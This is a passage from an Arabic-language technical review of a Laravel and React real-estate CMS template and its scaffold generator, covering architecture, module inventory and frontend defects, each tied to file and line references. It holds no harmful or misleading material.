# PDR — مراجعة تصميم ومتطلبات مشروع BP Engine / Reel Estate Template

> **نوع المستند:** Product Design / Requirements Review — مراجعة فنية مبنية على قراءة الكود سطر بسطر.
> **تاريخ المراجعة:** 2026-08-20 · **الفرع:** `main` · **آخر كوميت في الـ scaffold:** `506a127` · **آخر كوميت في `engine/`:** `f18c6ed`
> **نطاق المراجعة:** الريبو `engine-scaffold` بالكامل (`setup.sh` + `overlay/`) + التطبيق المتولّد `engine/` (ريبو منفصل: `Real-Estate-Template-`).
> **قاعدة أساسية:** كل ادعاء في المستند ده مربوط بمسار ملف ورقم سطر. أي حاجة مش موجودة، مكتوب صراحةً إنها **مش موجودة**.

---

## 1. الملخص التنفيذي

### 1.1 إيه المشروع ده فعلًا

`engine-scaffold` هو **مولّد مشاريع (scaffold)** مش تطبيق. بيتكوّن من حتّتين:

1. `setup.sh` + `overlay/` — سكريبت بينشئ Laravel 12 نضيف، بيثبّت الحزم، بيولّد 10 موديولات بـ `nwidart/laravel-modules`، وبعدين بينسخ فوقه 43 ملف من `overlay/` (`setup.sh:62`).
2. `engine/` — التطبيق المتولّد فعليًا. ده **مش** مجرد ناتج `setup.sh`، ده مشروع اتطوّر فوقه 9 كوميتات إضافية وله ريبو منفصل (`https://github.com/AbdoAmmar96/Real-Estate-Template-.git`) و 428 ملف متتبَّع. **الكود الحقيقي كله هنا.**

الدومين: موقع/CMS عقاري مصري، عربي أولًا مع RTL، ثنائي اللغة `/ar` و `/en`، Theme Engine بيقرا الألوان من قاعدة البيانات، وداشبورد React مخصوص من غير Filament.

### 1.2 النضج الحقيقي لكل طبقة

النسب دي **مش تقديرية على البركة** — كل واحدة مبنية على جرد فعلي للملفات والوظائف الشغالة مقابل الوظائف اللي المنتج محتاجها فعلًا عشان يشتغل كموقع عقاري إنتاجي.

| الطبقة | النسبة | التبرير المباشر |
|---|---|---|
| **Backend / Data** | **55%** | 6 جداول دومين حقيقية شغالة (`settings`, `locations`, `developers`, `compounds`, `properties`, `leads`, `posts`) + `ResourceController` عام بيدّي CRUD كامل لـ 7 ريسورسات. **بس:** مفيش رفع ملفات خالص، مفيش `exists` validation على أي FK، مفيش policies، مفيش API شغال (40 راوت API بتشاور على guard مش موجود)، السعر مخزّن `string` فمفيش فلترة رقمية، ومفيش `slug` على العقارات/الكمبوندات فمفيش صفحات تفصيلية أصلًا. |
| **Frontend / Site** | **35%** | 8 صفحات بترندر وتصميمها محترم (3,665 سطر TS/TSX، `tsc --noEmit` نضيف تمامًا، صفر `any`). **بس:** البحث في الهيرو والرئيسية **مش شغال بالمرة**، مفيش صفحة تفاصيل لأي عقار أو كمبوند، مفيش pagination، مفيش `<Head>` واحد في المشروع كله (يعني مفيش title/meta/canonical لأي صفحة)، ومفيش نظام i18n — الترجمة كلها `ternary` مكرّر في كل ملف. |
| **Admin Dashboard** | **45%** | فكرة `ResourceController` + شاشتين عامّتين (`Index`/`Form`) فكرة ممتازة وبتشتغل: إضافة موديول جديد = كلاس صغير + راوت. الإعدادات والثيم شغالين فعلًا. **بس:** مفيش Media Manager (حقل الصورة = خانة نص لمسار!)، الداشبورد الرئيسي صفر KPIs، مجموعتين إعدادات (`seo`, `integrations`) موجودين في الراوتات ومش موجودين في المنيو، والأدوار `editor`/`agent` بتتعمل ومبتفتحش أي شاشة. |
| **Content** | **10%** | كل المحتوى تجريبي أو مُختلَق. `app/Support/DemoContent.php` = 310 سطر بيانات وهمية. صفحة "من نحن" بتقول "12 سنة" و"46 فرد" و"4780 عميل" و"420 كمبوند شريك" — كلها أرقام مخترعة (`engine/resources/js/Pages/Site/About.tsx:21-26`)، وصور الفريق ستوك من Unsplash معروضة كأنها الفريق الحقيقي. |
| **Tests** | **2%** | ملفين تست افتراضيين من Laravel بس، **وواحد منهم بيفشل**. `php artisan test` → `Tests: 1 failed, 1 passed`. مجلدات التستات في الـ 10 موديولات كلها فاضية (`.gitkeep` بس). |
| **DevOps** | **5%** | مفيش CI، مفيش Dockerfile، مفيش deploy config، مفيش `.env.production`. SQLite بيتشحن كـ default، و`APP_DEBUG=true` في القالب المشحون (`engine/.env.example:4`). |
| **الإجمالي المرجّح** | **~35%** | المنتج **prototype متقدّم**، مش MVP. الوصف الأدق: "template بواجهة حلوة ومحرك محتوى بدائي". |

### 1.3 الحكم في سطر واحد

> كلام صاحب المشروع دقيق ومتأكَّد منه بالكود: **الباك إند اتبنى واتربط بالفرونت، لكن الفرونت لسه template مش موقع.** الأدلة الحاسمة: البحث decoration مش وظيفة، مفيش صفحة تفاصيل لعقار، مفيش SEO metadata خالص، والـ WebGL hero اللي اتكتب في README كـ feature رئيسي **اتشال من الصفحة الرئيسية وبقى كود ميت**.

---

## 2. المعمارية الحالية

### 2.1 الرسم النصي

```
                      ┌──────────────────────────────────────────────┐
   المتصفح  ────────► │  public/index.php → bootstrap/app.php        │
                      │  withRouting(web: routes/web.php)            │
                      │  ⚠ مفيش api: — راوتات الـ API بتتسجّل بس     │
                      │     من RouteServiceProvider بتاع كل موديول   │
                      └──────────────────┬───────────────────────────┘
                                         │
              ┌──────────────────────────┼──────────────────────────┐
              │                          │                          │
   ┌──────────▼──────────┐  ┌────────────▼───────────┐  ┌───────────▼──────────┐
   │  routes/web.php     │  │ Modules/*/routes/web   │  │ Modules/*/routes/api │
   │  الموقع العام       │  │ /admin/*               │  │ /api/v1/*            │
   │  /{ar|en}/...       │  │ auth + role:admin      │  │ ⛔ auth:sanctum       │
   │  middleware: locale │  │                        │  │    guard مش موجود    │
   └──────────┬──────────┘  └────────────┬───────────┘  │    ⇒ 40 راوت ميت     │
              │                          │              └──────────────────────┘
              │                          │
   ┌──────────▼──────────┐  ┌────────────▼───────────────────────────┐
   │ App\Support\Catalog │  │ App\Support\ResourceController (abstract)│
   │  (root namespace!)  │  │  index/create/store/edit/update/destroy  │
   │  بيستورد 4 موديلات  │  │  + schema() ⇒ الفرونت بيتبني منها       │
   │  من 4 موديولات      │  └────────────┬───────────────────────────┘
   └──────────┬──────────┘               │ يورّثه
              │                    ┌─────┴──────────────────────────┐
              │                    │ PropertyAdmin · CompoundAdmin  │
              ▼                    │ DeveloperAdmin · LocationAdmin │
   ┌─────────────────────┐         │ LeadAdmin · PostAdmin · UserAdmin│
   │ Modules/*/Models    │◄────────┴────────────────────────────────┘
   │ Property · Compound │
   │ Location · Developer│
   │ Lead · Post         │  ⚠ الاتجاهين: root→module و module→root
   │ Core\Setting        │     ⇒ الموديولات مش مستقلة فعليًا
   └──────────┬──────────┘
              │
   ┌──────────▼───────────────────────────────────────────────────┐
   │ HandleInertiaRequests::share()                               │
   │  settings (public only) · locale · auth.user · flash         │
   └──────────┬───────────────────────────────────────────────────┘
              │
   ┌──────────▼───────────────────────────────────────────────────┐
   │ resources/views/app.blade.php                                │
   │  ⚡ يحقن theme tokens من DB كـ CSS variables في <style>       │
   │  + Cairo من Google Fonts + GTM لو متظبّط                      │
   └──────────┬───────────────────────────────────────────────────┘
              │
   ┌──────────▼───────────────────────────────────────────────────┐
   │ resources/js/app.tsx → createInertiaApp                      │
   │  ⚠ import.meta.glob(..., { eager: true }) ⇒ bundle واحد      │
   │     496 KB (156 KB gzip) — مفيش code-splitting               │
   └──────────┬───────────────────────────────────────────────────┘
              │
   ┌──────────▼──────────┐   ┌─────────────────────────────────────┐
   │ Layouts/SiteLayout  │   │ Layouts/AdminLayout                 │
   │  Pages/Site/*.tsx   │   │  Pages/Admin/Resource/{Index,Form}   │
   │  (8 صفحات)          │   │  Pages/Admin/{Dashboard,Login,Settings}│
   └─────────────────────┘   └─────────────────────────────────────┘
```

### 2.2 دورة حياة الطلب (Request Lifecycle) — مثال حقيقي: `GET /ar`

1. **الدخول:** `engine/public/index.php` → `engine/bootstrap/app.php:8`. لاحظ إن `withRouting()` في `bootstrap/app.php:9-13` مسجّل `web` و `commands` و `health` بس — **مفيش `api:`**.
2. **الميدل وير العام:** `HandleInertiaRequests` بيتضاف لمجموعة `web` (`bootstrap/app.php:15-17`)، و aliases الـ `role` و `permission` و `locale` بتتسجّل (`bootstrap/app.php:19-23`)، والضيوف بيتحوّلوا لـ `/admin/login` (`bootstrap/app.php:25`).
3. **الراوتنج:** `routes/web.php:10-13` بيعمل group بـ `prefix('{locale}')` مع `whereIn('locale', ['ar','en'])` وميدل وير `locale`. الجذر `/` بيتحوّل لـ `/ar` (`routes/web.php:7`).
4. **اللغة:** `App\Http\Middleware\SetLocale::handle` بياخد `locale` من الراوت، بيعمل `abort_unless` لو مش `ar|en` (`app/Http/Middleware/SetLocale.php:16`)، `app()->setLocale()` (`:18`)، و `URL::defaults(['locale' => $locale])` (`:21`) عشان `route()` تحقن اللغة تلقائيًا.
5. **الكنترولر:** مفيش كنترولر — الراوت closure مباشرة (`routes/web.php:15-20`) بينادي `App\Support\Catalog::properties()` و `::compounds()` و `::areas()` و `::searchOptions()`.
6. **طبقة البيانات:** `app/Support/Catalog.php:19-24` بيستعلم `Property::where('is_active',true)->with('location')->orderBy('sort')->orderByDesc('id')`. لو الجدول فاضي بيرجع لـ `DemoContent` (`Catalog.php:26-30`) — fallback ذكي بس بيخفي مشاكل الداتا.
7. **التحويل للـ props:** كل موديل عنده `toCard(string $locale)` بيرجّع نفس شكل الـ props اللي React متوقعه (`Modules/Properties/app/Models/Property.php:35-51`). الترجمة بتحصل عبر trait `App\Support\Bilingual::t()` (`app/Support/Bilingual.php:12-25`) اللي بيقرا العمود `<field>_en` لو اللغة `en` وإلا العمود الأساسي العربي.
8. **الـ shared props:** `App\Http\Middleware\HandleInertiaRequests::share` (`app/Http/Middleware/HandleInertiaRequests.php:23-40`) بيضيف `settings` (المجموعات `is_public` بس) و `locale` و `auth.user` و `flash`.
9. **الـ root view:** `resources/views/app.blade.php`. الـ `<html dir>` بيتحسب في `:8-10`، وتوكنز الثيم بتتحقن جوه `<style>` في `:22-28` بلوب على `$theme`.
10. **الـ CSS:** `resources/css/app.css:10-32` بيربط `@theme inline` بالـ CSS variables، فكلاس زي `bg-primary` بيقرا `var(--primary)` وقت التشغيل ⇒ تغيير اللون من الداشبورد = فوري بدون build. **دي أنضف حاجة في المشروع.**
11. **الـ hydration:** `resources/js/app.tsx:5-16` — `resolve` بيستخدم `import.meta.glob("./Pages/**/*.tsx", { eager: true })` (`:7`) فكل الصفحات بتتحمّل في بندل واحد.
12. **الرندر:** `Pages/Site/Home.tsx:141-385` جوه `SiteLayout`.

### 2.3 ملاحظتان معماريتان حاسمتان

- **الـ modular boundary مكسور في الاتجاهين.** `app/Support/Catalog.php:5-8` (كود root) بيستورد `Modules\Blog\Models\Post` و `Modules\Compounds\Models\Compound` و `Modules\Locations\Models\Location` و `Modules\Properties\Models\Property`. وفي الاتجاه العكسي، `Modules/*/Http/Controllers/*AdminController.php` كلها بترث `App\Support\ResourceController` (root). النتيجة: **تعطيل أي موديول من `modules_statuses.json` بيكسر الموقع العام بـ fatal error.** الـ modularity حاليًا تنظيمية للملفات بس، مش معمارية.
- **الـ SSR مضبوط ومش مستخدم.** `vite.config.ts:11` فيه `ssr: "resources/js/ssr.tsx"` و `resources/js/ssr.tsx` موجود (15 سطر)، لكن `package.json` سكريبت الـ `build` هو `vite build` بس من غير `--ssr`، ومفيش `config/inertia.php` منشور، ومفيش `inertia:start-ssr`. يعني SSR **مش شغال** — وده مهم جدًا لموقع عقاري بيعتمد على السيو.

---

## 3. جرد الموديولات

الأرقام دي من جرد فعلي: `find Modules -type f`. الـ baseline اللي `php artisan module:make` بيولّده = **27 ملف** لكل موديول (providers, config, blade stubs, vite config, `.gitkeep`s).

| الموديول | عدد الملفات | موجود فعليًا | ناقص | تقدير الشغل |
|---|---|---|---|---|
| **Core** | 36 | `Setting` model (`app/Models/Setting.php`) · `SettingsService` بكاش دائم + flush (`app/Services/SettingsService.php:16-75`) · `AuthController` (login/logout بالـ session) · `DashboardController` (بيرندر بس، **صفر props**) · `SettingsController` بـ 7 مجموعات و 45 مفتاح مترجم (`:16-76`) · `UserAdminController` (إدارة مستخدمين كاملة مع حماية آخر مدير) · migration `settings` · 3 seeders | مفيش Fortify/2FA · مفيش throttle على الـ login · مفيش activity log · مفيش permissions (جدول `permissions` فيه **0 صفوف**) · `CoreController.php` stub ميت بيرندر `view('core::index')` | 8–13 يوم |
| **Pages** | 27 | **لا شيء.** stub خام: `PagesController` بيرندر `view('pages::index')` وبيطبع "Hello World" (`resources/views/index.blade.php:2`) · راوتات `Route::resource('pages')` تحت `auth,verified` (`routes/web.php:6-8`) | مفيش model · مفيش migration · مفيش Block Builder · صفحات About/Contact حاليًا hardcoded في `routes/web.php:30-37` من `DemoContent` | 12–20 يوم |
| **Locations** | 30 | `Location` model + `Bilingual` + `hasMany(Property)` (`app/Models/Location.php`) · migration `locations` (7 أعمدة) · `LocationAdminController` (CRUD) · راوتات `/admin/locations/*` | مفيش `slug` · مفيش صفحة عامة `/locations/{slug}` · مفيش خرائط/إحداثيات · `LocationsController` stub ميت · مفيش index على `is_active`/`sort` | 3–5 يوم |
| **Developers** | 30 | `Developer` model (`app/Models/Developer.php`) · migration `developers` · `DeveloperAdminController` · راوتات أدمن | مفيش علاقة `hasMany(Compound)` معرّفة في الموديل · مفيش صفحة مطوّر عامة · مفيش `slug` · `DevelopersController` stub ميت | 3–5 يوم |
| **Compounds** | 30 | `Compound` model + `belongsTo(Developer,Location)` + `toCard()` (`app/Models/Compound.php`) · migration بـ 15 عمود و FKs · `CompoundAdminController` بـ 15 حقل | **مفيش صفحة تفاصيل كمبوند** — زرار "تفاصيل الكمبوند" بيروح للليستنج نفسه (`resources/js/Components/site/CompoundCard.tsx:56`) · مفيش gallery · مفيش master plan · مفيش أنواع وحدات · الأسعار `string` | 8–14 يوم |
| **Properties** | 30 | `Property` model + `belongsTo(Location,Compound)` + `toCard()` · migration بـ 17 عمود · `PropertyAdminController` بـ 15 حقل و 9 أنواع عقار (`:47-50`) | **مفيش صفحة تفاصيل عقار** · مفيش gallery (صورة واحدة `image` string) · `price` عمود `string` ⇒ **مستحيل الفلترة أو الترتيب بالسعر** · مفيش `slug` · مفيش خريطة · مفيش مقارنة · مفيش favorites | 12–20 يوم |
| **Leads** | 30 | `Lead` model بـ 5 حالات و 5 مصادر (`app/Models/Lead.php:14-28`) · migration بـ index على `status` (**الـ index الوحيد المضاف يدويًا في المشروع كله**) · `LeadController::store` عام مع validation (`:18-26`) · `LeadAdminController` (صندوق وارد) | **مفيش throttle ولا honeypot ولا captcha** على endpoint عام · مفيش إشعار إيميل/واتساب للفريق · مفيش assignment لمستشار · مفيش تصدير · مفيش تكامل CRM | 5–9 يوم |
| **Blog** | 29 | `Post` model بـ `scopePublished` و `buildSlug` فريد و `readMinutes` (`app/Models/Post.php:25-54`) · migration بـ 14 عمود و `slug` unique · `PostAdminController` بـ 14 حقل ثنائي اللغة · صفحات `/blog` و `/blog/{slug}` (في `routes/web.php:39-57`) | مفيش rich-text editor (المحتوى `textarea` خام بـ markdown يدوي بيتبارس في `Pages/Site/Post.tsx`) · مفيش تصنيفات كجدول · مفيش pagination · `api.php` تعليق بس | 5–8 يوم |
| **Seo** | 27 | **لا شيء.** stub خام: `SeoController` بيرندر `view('seo::index')` · راوتات `Route::resource('seos')` (`routes/web.php:6-8`) | مفيش model/migration · **مفيش `<Head>` في المشروع كله** ⇒ صفر meta tags · مفيش sitemap · مفيش robots ديناميكي · مفيش JSON-LD · مفيش hreflang · مفيش canonical · مفيش OG/Twitter | 8–14 يوم |
| **Reviews** | 27 | **لا شيء.** stub خام: `ReviewsController` بيرندر `view('reviews::index')` | مفيش model/migration · مفتاح `google_place_id` موجود في الإعدادات (`SettingsController.php:75`) ومش مستخدم في أي مكان | 4–7 يوم |

**الخلاصة:** 3 من 10 موديولات (`Pages`, `Seo`, `Reviews`) لسه **stubs خام 100%** — 27 ملف كلها متولّدة تلقائيًا. 6 موديولات فيها شغل حقيقي. `Core` هو الأنضج.

---

## 4. مراجعة الـ Frontend

### 4.1 نقاط القوة (تُذكر بأمانة)

1. **Type safety ممتاز.** `npx tsc --noEmit` بيعدّي **نضيف تمامًا** على 3,665 سطر. صفر `any`، صفر `@ts-ignore`، صفر `as any`. `tsconfig.json:7` فيه `"strict": true`. الأنواع معرّفة مركزيًا في `resources/js/lib/types.ts` (126 سطر، 14 interface).
2. **Theme Engine حقيقي وشغال.** `resources/css/app.css:10-32` + `resources/views/app.blade.php:22-28`. تغيير لون من الداشبورد بيغيّر الموقع كله من غير build. الادعاء ده مثبت بالكود مش تسويق.
3. **الـ Resource Kit العام فكرة قوية.** `Pages/Admin/Resource/Index.tsx` (148 سطر) + `Form.tsx` (189 سطر) بيخدموا 7 ريسورسات مختلفة من `schema()` جاية من السيرفر. إضافة موديول أدمن جديد = كلاس PHP صغير + 6 راوتات، **بدون أي ملف React جديد**. ده أفضل قرار معماري في المشروع.
4. **أداء الميديا مدروس.** `Components/site/FrameMedia.tsx:35-56`: poster فوري + `IntersectionObserver` بـ `rootMargin: 200px` + `requestIdleCallback` + احترام `prefers-reduced-motion`. نفس النمط في `HeroSearch.tsx:70-82`.
5. **RTL منفّذ صح في التفاصيل.** استخدام logical properties (`start-3`, `ps-64`, `border-s`) مش `left/right`. و`Components/site/PropertyCard.tsx:50-55` فيه تعليق دقيق بيشرح ليه الرقم والوحدة عنصرين منفصلين عشان ميتقلبوش في RTL. و`Components/site/PageHero.tsx:40` بيستخدم `rtl:rotate-180` على السهم.
6. **صفر `console.log` في الكود.**

### 4.2 المشاكل الحقيقية

#### (أ) 🔴 البحث كله decoration — مش وظيفة

المشروع فيه **فورمين بحث** في الصفحة الرئيسية الواحدة، وواحد منهم فاضي تمامًا والتاني نتيجته بتتجاهل.

**الفورم الأول (`HeroSearch`)** عنده `name` attributes صح:
```tsx
// engine/resources/js/Components/site/HeroSearch.tsx:145-152
<form action={`/${locale}/${tab === "project" ? "compounds" : "properties"}`} ...>
    <input type="hidden" name="purpose" value={purpose} />
```
`name="q"` في `HeroSearch.tsx:159`، `name="type"` في `:169`، `name="location"` في `:182`.

**لكن الراوت المستقبِل بيتجاهل كل الـ query params:**
```php
// engine/routes/web.php:22-24
Route::get('/properties', fn (string $locale) => Inertia::render('Site/Properties', [
    'properties' => \App\Support\Catalog::properties($locale),   // مفيش $request خالص
]))->name('properties');
```
`Catalog::properties()` (`app/Support/Catalog.php:17-33`) مبتاخدش أي فلاتر. **النتيجة: ضغط "ابحث" = إعادة تحميل نفس الصفحة بنفس النتائج.**

**الفورم التاني (في `Home.tsx`) أسوأ** — الحقول من غير `name` أصلًا:
```tsx
// engine/resources/js/Pages/Site/Home.tsx:220-227
<label className="flex flex-col gap-2">
    <span ...>{t.fArea}</span>
    <select className="...">          {/* ⚠ مفيش name */}
        <option>{t.fAreaAll}</option>  {/* ⚠ مفيش value */}
```
نفس الحاجة في `Home.tsx:232` و `:241` و `:250`. الفورم بيعمل GET لـ `/{locale}/properties` (`Home.tsx:217`) **من غير ما يبعت أي بيانات**.

وكمان `Home.tsx:40-41` بيعرّف `purposes` و `types` hardcoded في الصفحة، بينما `searchOptions.types` جاية من السيرفر (`Catalog.php:96-107`) ومستخدمة في `HeroSearch.tsx:173` — تكرار لنفس البيانات من مصدرين مختلفين.

> **الأثر:** أهم وظيفة في موقع عقاري (البحث) غير موجودة. الفلترة الوحيدة الشغالة هي client-side في `Properties.tsx:49-51` وبتشتغل على الليستنج المحمّل بس.

#### (ب) 🔴 الـ WebGL Hero — كود ميت بالكامل

`resources/js/Components/site/HeroWebGL.tsx` = 145 سطر شادر خام. **مش مستورد في أي ملف.** grep على كل `resources/` بيرجّع مطابقات في نفس الملف بس (السطر 4 تعليق والسطر 58 التعريف).

و`hero_variant` — المفتاح اللي المفروض يشغّله/يطفّيه — موجود في مكانين بس، والاتنين backend:
- `Modules/Core/database/seeders/SettingsSeeder.php:37` → `'hero_variant' => 'webgl'`
- `Modules/Core/app/Http/Controllers/SettingsController.php:48` → الليبل العربي

**مفيش أي قراءة له في الفرونت.**

الدليل القاطع على إنه اتشال عمدًا: نسخة `overlay/` **لسه بتستخدمه**:
```tsx
// overlay/resources/js/Pages/Site/Home.tsx:12
const HeroWebGL = lazy(() => import("@/Components/site/HeroWebGL"));
// overlay/resources/js/Pages/Site/Home.tsx:103
const webgl = (settings.theme?.hero_variant ?? "webgl") === "webgl";
// overlay/resources/js/Pages/Site/Home.tsx:111
<HeroWebGL />
```
لكن `engine/resources/js/Pages/Site/Home.tsx:1-9` (قايمة الـ imports) **مفيهاش `HeroWebGL` خالص** — الهيرو اتبدّل بـ `HeroSearch` (فيديو خلفية) في كوميت `1ff7eb7` ("الرئيسية: تنفيذ تصميم إكس هومز من كانفاس Claude Design").

**وحتى لو رجعناه، الشادر مش متضبّط على الدومين إطلاقًا:**
```glsl
// engine/resources/js/Components/site/HeroWebGL.tsx:38-41
vec3 col = u_base;
col = mix(col, u_gold, blob(uv, c1, 0.55) * 0.20);
col = mix(col, u_navy, blob(uv, c2, 0.60) * 0.10);
col = mix(col, u_gold, blob(uv, c3, 0.45) * 0.12);
```
ده 3 بقع لونية دائرية (`smoothstep` على المسافة، `HeroWebGL.tsx:21-23`) بتتحرك في دواير. **مفيش أي علاقة بعقارات ولا مدن ولا skyline ولا معمار.** الوصف في README v1.2 ("بقع ذهبي/كحلي متحركة") دقيق — وده بالظبط المشكلة.

**عيوب فنية إضافية في الكومبوننت لو اتصلّح:**
- `HeroWebGL.tsx:68-73` — `compile()` مبتفحصش `COMPILE_STATUS` أبدًا. أي خطأ في الشادر = شاشة سودة صامتة.
- `HeroWebGL.tsx:136-141` — الـ cleanup بيلغي الـ `raf` والـ observers بس. **مفيش `gl.deleteProgram` ولا `deleteShader` ولا `deleteBuffer` ولا `WEBGL_lose_context`.** مع تنقّل Inertia SPA، كل زيارة للرئيسية بتسيب WebGL context ورا — والمتصفحات بتحدّد ~16 context، وبعدها الكانفاس بيبطّل يشتغل.
- `HeroWebGL.tsx:52` — `raw.match(/^#([0-9a-f]{6})$/i)` بيقبل hex بـ 6 خانات بس. لو الأدمن حط `#FFF` (والـ UI بيسمح، شوف `Settings/Edit.tsx:28` اللي بيقبل `{3,8}`)، الشادر بيقع صامت على الـ fallback.

#### (ج) 🔴 صفر SEO metadata — مفيش `<Head>` في المشروع كله

grep على `resources/js` كله: **مفيش `Head` مستورد من `@inertiajs/react` ولا مرة واحدة.** كل الـ imports (23 ملف) بتاخد `Link`, `usePage`, `useForm`, `router` بس.

النتيجة: كل صفحة في الموقع بتاخد نفس الـ `<title>` من `app.blade.php:14`:
```blade
<title inertia>{{ $general['site_name'] ?? config('app.name') }}</title>
```
يعني `/ar/properties` و `/ar/blog/some-post` و `/ar/about` كلهم بنفس العنوان "المنصة العقارية".

**اللي ناقص بالكامل:** `<meta name="description">` لكل صفحة · `<link rel="canonical">` · `<link rel="alternate" hreflang="ar|en">` (مهم جدًا لموقع ثنائي اللغة) · Open Graph / Twitter cards · JSON-LD (`RealEstateListing`, `Organization`, `BreadcrumbList`) · `sitemap.xml` · `robots.txt` ديناميكي (`public/robots.txt` هو الافتراضي 24 بايت).

ومفتاحي `meta_title` و `meta_description` موجودين في الإعدادات (`SettingsController.php:70-71`) ومتزرّعين فاضيين (`SettingsSeeder.php:68-71`) — **ومش مقروءين في أي مكان.**

> **الأثر:** لموقع عقاري بيعيش على البحث العضوي، ده حاجب إطلاق. زي ما هو دلوقتي، جوجل هيفهرس صفحات متطابقة العناوين وبدون وصف.

#### (د) 🟠 مفيش نظام i18n — الترجمة `ternary` مكرّر في كل ملف

مفيش `lang/ar/messages.php` ولا `lang/en/*` ولا `react-i18next` ولا أي شيء. `engine/lang/` فيه ملف واحد بس: `lang/ar/validation.php`.

النمط المتبع: كل صفحة بتعرّف object `copy` جوّاها.
- `Pages/Site/Home.tsx:17-106` → 90 سطر نصوص (44 مفتاح × لغتين)
- `Pages/Site/Contact.tsx:9-68` → 60 سطر
- `Pages/Site/About.tsx:8-51` → 44 سطر
- `Components/site/HeroSearch.tsx:15-54` → 40 سطر
- `Pages/Site/Properties.tsx:10-35`, `Compounds.tsx:8-31`, `Blog.tsx`, `Post.tsx` → نفس الحكاية

وبجانبها ternaries مبعثرة داخل الـ JSX نفسه:
```tsx
// engine/resources/js/Layouts/SiteLayout.tsx:82
<span ...>{ar ? "السبت – الخميس · 10ص – 8م" : "Sat – Thu · 10am – 8pm"}</span>
// engine/resources/js/Layouts/SiteLayout.tsx:113
{ar ? item.ar : item.en}
// engine/resources/js/Pages/Site/Compounds.tsx:92
{ar ? "تاريخ التسليم موثّق في العقد" : "Delivery date documented in the contract"}
```
ونفس النص متكرر حرفيًا في ملفين: `"السبت – الخميس · 10ص – 8م"` في `SiteLayout.tsx:82` و `Contact.tsx:31`.

> **الأثر:** إضافة لغة ثالثة = تعديل 10 ملفات. تعديل نص واحد = بحث نصي في المشروع كله. والأخطر: **مفيش أي طريقة يغيّر بيها العميل أي نص من الداشبورد** — كل نصوص الموقع مدفونة في الـ bundle.

#### (هـ) 🟠 تكرار واضح: `CompoundCard` مكتوب مرتين بشكل متباعد

`resources/js/Components/site/CompoundCard.tsx` (64 سطر) مستخدم في `Home.tsx:288` بس.
وصفحة `Pages/Site/Compounds.tsx:56-107` **بتكرر نفس الكارت inline** بنسخة مختلفة (4 خانات بدل 3، فيها `delivery` و `desc` وزرار واتساب بدل زرار "تفاصيل").

النتيجة: نفس الكمبوند بيبان بشكلين مختلفين في صفحتين. وأي تعديل على تصميم كارت الكمبوند لازم يتعمل مرتين.

نفس النمط الأخف: `PropertyCard.tsx` مستخدم في `Home.tsx:274` و `Properties.tsx:101` — ده صح، بس هو الاستثناء.

#### (و) 🟠 منطق العرض بيعتمد على نص مترجم — هشّ

```tsx
// engine/resources/js/Components/site/PropertyCard.tsx:5
const isRent = p.purpose === "إيجار" || p.purpose === "Rent";
```
`purpose` بييجي من الباك إند **مترجم بالفعل**:
```php
// engine/Modules/Properties/app/Models/Property.php:43
'purpose' => $this->purpose === 'rent' ? ($ar ? 'إيجار' : 'Rent') : ($ar ? 'بيع' : 'Sale'),
```
يعني الفرونت بيقارن نصوص UI عشان ياخد قرار تصميمي (لون الشارة). أي تعديل في الترجمة (مثلًا "للإيجار") بيكسر اللون بصمت. المفروض `toCard()` يبعت `purpose_key: 'rent'` جنب النص المعروض.

نفس المشكلة تسرّبت جوه الكومبوننت العام للأدمن:
```tsx
// engine/resources/js/Pages/Admin/Resource/Index.tsx:77
if (key === "purpose") return v === "rent" ? "إيجار" : "بيع";
```
منطق دومين (عقارات) داخل جدول المفروض إنه generic لأي ريسورس.

#### (ز) 🟠 الحالات الناقصة (loading / empty / error)

| الحالة | الوضع |
|---|---|
| **Loading** | مفيش أي skeleton أو spinner في المشروع. الاعتماد كله على شريط تقدّم Inertia العام (`app.tsx:13-15`). في الأدمن في `processing` على الأزرار بس (`Resource/Form.tsx:170`, `Settings/Edit.tsx:51`). |
| **Empty** | موجود في `Properties.tsx:105-123` (تصميم كويس مع زرار مسح الفلاتر) وفي `ResourceTable.tsx:69-75`. **ناقص في `Compounds.tsx:54`** — `compounds.map()` من غير أي فحص طول، فلو الجدول فاضي والـ demo fallback اتشال، الصفحة بتبقى بيضا. **وناقص في `Blog.tsx`** بنفس الشكل. |
| **Error** | **مفيش error boundary واحد في المشروع كله.** والأخطر — فورم "اتصل بنا" بيبلع أخطاء الـ validation: |

```tsx
// engine/resources/js/Pages/Site/Contact.tsx:91-112
router.post(`/${locale}/leads`, { ...form, message: form.details, source: "contact" }, {
    preserveScroll: true,
    onFinish: () => setSending(false),
    onSuccess: () => { /* ... يفتح واتساب ... */ setSent(true); },
    // ⚠ مفيش onError خالص
});
```
لو الباك إند رفض الطلب (`LeadController.php:18-26` بيرفض تليفون أطول من 40 حرف أو إيميل غلط)، المستخدم **مش بيشوف أي رسالة** — الزرار بيرجع طبيعي والفورم زي ما هو. الليد ضاع والعميل مش عارف.

ونفس المشكلة في شاشة الإعدادات:
```tsx
// engine/resources/js/Pages/Admin/Settings/Edit.tsx:21
const { data, setData, put, processing } = useForm<...>({ values });  // ⚠ errors مش مستخرجة
```

#### (ح) 🟠 إتاحة (a11y) ضعيفة

grep على `aria-` في كل `resources/js`: **`SiteLayout.tsx` بس فيه 3 استخدامات**، الباقي شبه خالي (باستثناء `aria-label` قليلة في الأدمن و`aria-hidden` على الفواصل).

- **عنوانين `<h1>` في نفس الصفحة الرئيسية:** `HeroSearch.tsx:132` و `Home.tsx:154`.
- زرار منيو الموبايل مفيهوش `aria-expanded` ولا `aria-controls` (`SiteLayout.tsx:152-158`).
- مفيش skip-to-content link، ومفيش `aria-label` على أي `<nav>` (فيه 3 عناصر `<nav>`: `SiteLayout.tsx:102`, `:163`, `PageHero.tsx:36`).
- `FlashBanner` (`Components/admin/ui.tsx:88-111`) مفيهوش `role="status"` ولا `aria-live` — قارئ الشاشة مش هيقرا "تم الحفظ".
- تبويبات البحث (`HeroSearch.tsx:84-94`) أزرار عادية من غير `role="tab"` ولا `aria-selected`.
- الحذف بيستخدم `confirm()` الأصلي للمتصفح (`Resource/Index.tsx:92`)، ومشاركة المقال بتستخدم `alert()` (`Pages/Site/Post.tsx:116`).

#### (ط) 🟡 مشاكل SSR-safety (مهمة لو SSR اتفعّل)

3 مواضع بتقرا `window` وقت الرندر مش جوه `useEffect`:
- `Layouts/SiteLayout.tsx:34` — `typeof window !== "undefined" ? window.location.pathname : ...` (فيه حارس بس القيمة بتختلف بين السيرفر والكلاينت ⇒ hydration mismatch على الـ active nav).
- `Layouts/AdminLayout.tsx:45` — نفس النمط.
